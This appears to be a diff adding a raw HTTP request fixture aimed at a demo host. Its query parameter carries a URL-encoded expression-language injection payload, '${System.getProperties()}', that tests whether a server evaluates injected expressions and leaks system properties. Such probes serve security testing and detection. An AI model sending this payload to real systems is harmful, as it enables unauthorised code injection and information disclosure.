@@ -1,0 +1,4 @@
+GET /a?q=t%3D%24%7BSystem.getProperties%28%29%7D HTTP/1.1
+Host: demo.example.com
+Connection: close
+
